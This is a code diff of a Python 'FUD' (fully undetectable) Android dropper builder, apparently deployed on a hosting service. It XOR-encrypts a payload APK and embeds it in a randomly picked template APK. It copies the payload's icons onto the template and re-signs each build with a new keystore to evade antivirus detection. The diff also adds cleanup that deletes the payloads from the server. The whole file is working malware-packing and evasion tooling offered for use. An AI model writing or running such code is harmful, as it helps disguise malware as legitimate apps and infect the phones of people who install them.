@@ -1,16 +1,15 @@
-"""FUD pipeline — pure ZIP, no apktool. Fast on Render free tier."""
+"""FUD pipeline — variant pick + payload inject + max signing + cleanup."""
 import os
+import glob
+import random
 import shutil
 import subprocess
 import time
 import zipfile
-import random
-import string
 
 from config import (
-    PAYLOAD_XOR_KEY, TEMPLATE_APK, KEYSTORE_DIR,
-    KEYSTORE_PASS, KEY_ALIAS, APKSIGNER_BIN,
-    ZIPALIGN_BIN,
+    PAYLOAD_XOR_KEY, VARIANTS_DIR, TEMPLATE_APK, KEYSTORE_DIR,
+    KEYSTORE_PASS, KEY_ALIAS, APKSIGNER_BIN, ZIPALIGN_BIN,
 )
 from setup import ensure_tools
 
@@ -33,8 +32,21 @@ def _xor_encrypt(data: bytes, key: bytes) -> bytes:
     return bytes(out)
 
 
+def _pick_template() -> str:
+    variants = []
+    if os.path.isdir(VARIANTS_DIR):
+        variants = sorted(glob.glob(os.path.join(VARIANTS_DIR, "*.apk")))
+    if variants:
+        pick = random.choice(variants)
+        print(f"[i] variant: {os.path.basename(pick)}", flush=True)
+        return pick
+    if os.path.exists(TEMPLATE_APK):
+        print("[i] fallback template.apk", flush=True)
+        return TEMPLATE_APK
+    raise RuntimeError("no template")
+
+
 def _extract_icons(payload_apk: str) -> dict:
-    """payload APK se saare launcher icons nikaalo."""
     icons = {}
     try:
         with zipfile.ZipFile(payload_apk, "r") as z:
@@ -55,19 +67,7 @@ def _extract_icons(payload_apk: str) -> dict:
     return icons
 
 
-def _extract_label(payload_apk: str) -> str:
-    """resources.arsc se label nikalna mushkil hai.
-    Fallback: APK filename."""
-    base = os.path.basename(payload_apk)
-    if base.endswith(".apk"):
-        base = base[:-4]
-    # "update_app" → "Update App"
-    parts = base.replace("_", " ").replace("-", " ").split()
-    return " ".join(p.title() for p in parts) or "System Update"
-
-
-def _generate_keystore(session_dir: str) -> str:
-    """Har build ke liye naya 4096-bit RSA keystore."""
+def _generate_keystore() -> str:
     os.makedirs(KEYSTORE_DIR, exist_ok=True)
     ks = os.path.join(KEYSTORE_DIR,
                       f"k_{int(time.time())}_{random.randint(1000,9999)}.p12")
@@ -108,13 +108,13 @@ def _generate_keystore(session_dir: str) -> str:
     return ks
 
 
-def _sign(unsigned_apk: str, output_apk: str, session_dir: str):
-    ks = _generate_keystore(session_dir)
+def _sign(unsigned_apk: str, output_apk: str):
+    ks = _generate_keystore()
     aligned = unsigned_apk + ".aligned"
 
     subprocess.run(
         [ZIPALIGN_BIN, "-f", "-p", "4", unsigned_apk, aligned],
-        check=True, capture_output=True,
+        check=True, capture_output=True, timeout=120,
     )
 
     cmd = [
@@ -130,7 +130,7 @@ def _sign(unsigned_apk: str, output_apk: str, session_dir: str):
         "--out", output_apk,
         aligned,
     ]
-    p = subprocess.run(cmd, capture_output=True, text=True)
+    p = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
     if p.returncode != 0:
         raise RuntimeError(f"apksigner: {p.stdout} {p.stderr}")
 
@@ -144,21 +144,17 @@ def full_fud_pipeline_dropper(template_apk: str, payload_apk: str,
     ensure_tools()
     os.makedirs(session_dir, exist_ok=True)
 
-    if not os.path.exists(template_apk):
-        raise RuntimeError("template missing")
+    if not template_apk or not os.path.exists(template_apk):
+        template_apk = _pick_template()
 
-    _step(session_dir, "1/4 read payload")
+    _step(session_dir, "1/3 encrypt payload + extract icons")
     with open(payload_apk, "rb") as f:
         payload_bytes = f.read()
-    print(f"[i] payload {len(payload_bytes)} bytes", flush=True)
-
-    _step(session_dir, "2/4 encrypt + icons")
     encrypted = _xor_encrypt(payload_bytes, PAYLOAD_XOR_KEY)
     icons = _extract_icons(payload_apk)
-    label = _extract_label(payload_apk)
-    print(f"[i] {len(icons)} icons, label='{label}'", flush=True)
+    print(f"[i] payload {len(payload_bytes)}b, {len(icons)} icons", flush=True)
 
-    _step(session_dir, "3/4 rebuild zip")
+    _step(session_dir, "2/3 rebuild apk")
     unsigned = os.path.join(session_dir, "unsigned.apk")
 
     with zipfile.ZipFile(template_apk, "r") as zin, \
@@ -168,40 +164,39 @@ def full_fud_pipeline_dropper(template_apk: str, payload_apk: str,
 
         for item in zin.infolist():
             fn = item.filename
-
-            if fn.startswith("META-INF/"):
+            if fn.startswith("META-INF/") or fn == "assets/output.apk":
                 continue
-            if fn == "assets/output.apk":
-                continue
-
-            # icon replace
             if fn in icons:
                 zout.writestr(item, icons[fn])
                 continue
-
             try:
                 data = zin.read(fn)
             except Exception:
                 continue
-
-            # APK-critical files STORED
             if fn.endswith(".dex") or fn == "resources.arsc" or fn == "AndroidManifest.xml":
                 zout.writestr(item, data, compress_type=zipfile.ZIP_STORED)
             else:
                 zout.writestr(item, data)
 
-        # agar payload me extra icons hain, add karo
         for fn, data in icons.items():
             if fn not in template_names:
                 zout.writestr(fn, data)
 
-        # encrypted payload
         info = zipfile.ZipInfo("assets/output.apk")
         info.compress_type = zipfile.ZIP_STORED
         zout.writestr(info, encrypted)
 
-    _step(session_dir, "4/4 sign")
-    _sign(unsigned, output_apk, session_dir)
+    _step(session_dir, "3/3 sign")
+    _sign(unsigned, output_apk)
+
+    # CLEANUP — server pe kuch na bache
+    try:
+        if os.path.exists(unsigned):
+            os.remove(unsigned)
+        if os.path.exists(payload_apk):
+            os.remove(payload_apk)
+    except Exception:
+        pass
 
     _step(session_dir, "done")
     print(f"[✓] DONE → {output_apk}", flush=True)
@@ -209,20 +204,13 @@ def full_fud_pipeline_dropper(template_apk: str, payload_apk: str,
 
 
 def full_fud_pipeline(input_apk: str, output_apk: str, session_dir: str) -> str:
-    """Direct mode bhi ZIP-only."""
-    _step(session_dir, "ensure_tools")
     ensure_tools()
     os.makedirs(session_dir, exist_ok=True)
-
-    _step(session_dir, "1/2 copy")
-    shutil.copy2(input_apk, output_apk)
-
-    _step(session_dir, "2/2 sign")
     tmp = output_apk + ".unsigned"
-    shutil.move(output_apk, tmp)
-    _sign(tmp, output_apk, session_dir)
+    shutil.copy2(input_apk, tmp)
+    _sign(tmp, output_apk)
     if os.path.exists(tmp):
         os.remove(tmp)
-
-    _step(session_dir, "done")
+    if os.path.exists(input_apk):
+        os.remove(input_apk)
     return output_apk
